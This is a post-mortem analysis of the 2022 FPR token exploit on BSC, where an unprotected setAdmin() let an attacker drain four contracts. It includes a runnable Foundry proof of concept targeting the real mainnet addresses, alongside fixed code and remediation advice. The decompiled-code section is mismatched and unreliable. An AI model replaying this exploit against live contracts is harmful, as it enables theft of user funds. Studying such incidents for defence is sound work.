# FPR — setAdmin() + remaining() Access Control Vulnerability Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | FPR Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~$29,000 |
| **FPR Token** | [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d](https://bscscan.com/address/0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d) |
| **Vulnerable Contract 1** | [0x81c5664be54d89E725ef155F14cf34e6213297B7](https://bscscan.com/address/0x81c5664be54d89E725ef155F14cf34e6213297B7) |
| **Vulnerable Contract 2** | [0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532](https://bscscan.com/address/0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532) |
| **Vulnerable Contract 3** | [0x39eb555f5F7AFd11224ca10E406Dba05B4e21BD3](https://bscscan.com/address/0x39eb555f5F7AFd11224ca10E406Dba05B4e21BD3) |
| **Vulnerable Contract 4** | [0xBa5B235CDDaAc2595bcE6BaB79274F57FB82Bf27](https://bscscan.com/address/0xBa5B235CDDaAc2595bcE6BaB79274F57FB82Bf27) |
| **FPR/USDT Pair** | [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b](https://bscscan.com/address/0x039D05a19e3436c536bE5c814aaa70FcdbDde58b) |
| **Uniswap V2 Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | The `setAdmin(address)` function is callable by anyone without access control, allowing arbitrary acquisition of admin privileges and draining FPR tokens and LP positions from contracts via the `remaining()` function |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/FPR_exp.sol) |

---
## 1. Vulnerability Overview

The FPR token ecosystem contained four vulnerable contracts. Each contract allowed an admin to be set via the `setAdmin(address)` function; however, this function lacked access control, allowing anyone to register themselves as admin. Once registered as admin, the `remaining(address token, address recipient)` function could be called to withdraw FPR tokens or LP tokens held in the contract to an arbitrary address. The attacker called `setAdmin()` on each of the four contracts to acquire admin privileges, extracted FPR tokens via `remaining()`, then swapped them for USDT through the FPR/USDT pair, stealing approximately $29,000.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable contract — no access control on setAdmin()
contract FPRVault {
    address public admin;
    IERC20 public fpr;

    // ❌ Callable by anyone — no onlyOwner/onlyExistingAdmin
    function setAdmin(address newAdmin) external {
        // ❌ Missing: require(msg.sender == owner, "Not owner");
        admin = newAdmin;
    }

    // Withdrawal function callable only by admin
    function remaining(address token, address recipient) external {
        require(msg.sender == admin, "Not admin");
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(recipient, bal);
    }
}

// ✅ Correct pattern — only owner can change admin
contract SafeFPRVault {
    address public admin;
    address public immutable owner;

    constructor() {
        owner = msg.sender;
        admin = msg.sender;
    }

    // ✅ Only owner can change admin
    function setAdmin(address newAdmin) external {
        require(msg.sender == owner, "Not owner");
        require(newAdmin != address(0), "Zero address");
        admin = newAdmin;
    }

    // ✅ Only admin can withdraw (only owner can change admin)
    function remaining(address token, address recipient) external {
        require(msg.sender == admin, "Not admin");
        require(recipient != address(0), "Zero recipient");
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(recipient, bal);
    }
}
```

---
### On-chain Original Code

Source: Bytecode decompilation


**FPR_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `setAdmin(address)` function is callable by anyone without access control, allowing arbitrary acquisition of admin privileges and draining FPR tokens and LP
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Call Contract1.setAdmin(attacker)
    │       ❌ No access control → attacker = admin
    │
    ├─[2] Call Contract1.remaining(FPR, attacker)
    │       Drain entire FPR balance from Contract1
    │
    ├─[3] Call Contract2.setAdmin(attacker)
    │       ❌ Same pattern repeated
    │
    ├─[4] Call Contract2.remaining(FPR, attacker)
    │       Drain entire FPR balance from Contract2
    │
    ├─[5] Call Contract3.setAdmin(attacker) + remaining()
    │       Drain entire FPR balance from Contract3
    │
    ├─[6] Call Contract4.setAdmin(attacker)
    │       ❌ This contract holds LP tokens
    │
    ├─[7] Call Contract4.remaining(LP token, attacker)
    │       Drain FPR/USDT LP tokens
    │
    ├─[8] LP tokens → removeLiquidity → Receive FPR + USDT
    │
    ├─[9] Swap FPR → USDT (Uniswap V2 Router)
    │
    └─[10] Net profit: ~$29,000 USDT
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IVulContract {
    function setAdmin(address newAdmin) external;
    function remaining(address token, address recipient) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
    function removeLiquidity(
        address, address, uint256, uint256, uint256, address, uint256
    ) external returns (uint256, uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract FPRExploit is Test {
    IERC20          FPR     = IERC20(0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d);
    IERC20          USDT    = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20          pair    = IERC20(0x039D05a19e3436c536bE5c814aaa70FcdbDde58b);
    IUniswapV2Router router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IVulContract[4] vaults = [
        IVulContract(0x81c5664be54d89E725ef155F14cf34e6213297B7),
        IVulContract(0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532),
        IVulContract(0x39eb555f5F7AFd11224ca10E406Dba05B4e21BD3),
        IVulContract(0xBa5B235CDDaAc2595bcE6BaB79274F57FB82Bf27)
    ];

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT", USDT.balanceOf(address(this)), 18);

        // [Steps 1~5] Drain FPR from Contracts 1~3
        for (uint256 i = 0; i < 3; i++) {
            // ⚡ No access control on setAdmin() → acquire admin privileges arbitrarily
            vaults[i].setAdmin(address(this));
            vaults[i].remaining(address(FPR), address(this));
        }

        // [Steps 6~7] Drain LP tokens from Contract4
        vaults[3].setAdmin(address(this));
        vaults[3].remaining(address(pair), address(this));

        // [Step 8] LP tokens → FPR + USDT
        uint256 lpBal = pair.balanceOf(address(this));
        pair.approve(address(router), type(uint256).max);
        router.removeLiquidity(
            address(FPR), address(USDT),
            lpBal, 0, 0, address(this), block.timestamp
        );

        // [Step 9] Swap FPR → USDT
        FPR.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(FPR); path[1] = address(USDT);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FPR.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        emit log_named_decimal_uint("[End] USDT", USDT.balanceOf(address(this)), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | No access control on `setAdmin()` → asset theft via `remaining()` |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Access Control Vulnerability |
| **Attack Vector** | `setAdmin(attacker)` × 4 → `remaining(FPR/LP)` × 4 → Remove liquidity → Swap FPR→USDT |
| **Preconditions** | No access control (e.g., `onlyOwner`) on `setAdmin()` function; `remaining()` function allows admin unrestricted asset withdrawal |
| **Impact** | ~$29,000 USDT |

---
## 6. Remediation Recommendations

1. **Access control on setAdmin()**: Add an `onlyOwner` modifier to `setAdmin()` so that only the current owner can change the admin.
2. **Two-step admin transfer**: Introduce a propose → accept two-step process for admin changes to prevent immediate privilege hijacking.
3. **Withdrawal function whitelist**: Restrict the `recipient` parameter of `remaining()` to a pre-approved address whitelist only.
4. **Multisig or timelock**: Protect asset withdrawal functionality with a multisig or timelock to prevent immediate theft.

---
## 7. Lessons Learned

- **Pure access control attack without flash loans**: This attack stole $29,000 using nothing but a misconfigured access control — no flash loans or price manipulation involved. Access control is the most fundamental yet most frequently overlooked security element.
- **Identical pattern across 4 contracts**: The same vulnerability appearing across four contracts demonstrates that code was copy-pasted and deployed without security review. Security templates must be applied to any reused contract patterns.
- **Danger of admin-change functions**: Functions such as `setAdmin()`, `transferOwnership()`, and `changeAdmin()` represent some of the most powerful attack vectors. These functions must always be protected with multi-factor authentication and a timelock.